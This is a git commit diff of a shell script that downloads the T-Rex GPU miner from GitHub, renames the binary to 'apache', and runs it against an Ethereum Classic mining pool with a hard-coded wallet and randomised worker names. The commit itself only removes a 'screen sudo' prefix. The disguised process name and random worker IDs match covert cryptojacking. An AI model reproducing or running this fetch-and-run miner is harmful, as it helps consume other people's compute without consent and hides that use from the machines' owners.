db1a0cb1190def618a06b9758f5726ccf57c4b04
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-19 23:27:49 +0700

    Update Trex.sh

--- Trex.sh
+++ Trex.sh
@@ -14,5 +14,4 @@ cd ..
 wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
 tar -xf t-rex-0.25.15-linux.tar.gz
 mv t-rex apache
-
-screen sudo ./apache -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -p x -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
+./apache -a etchash -o stratum+tcp://etc.2miners.com:1010 -u 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 -p x -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
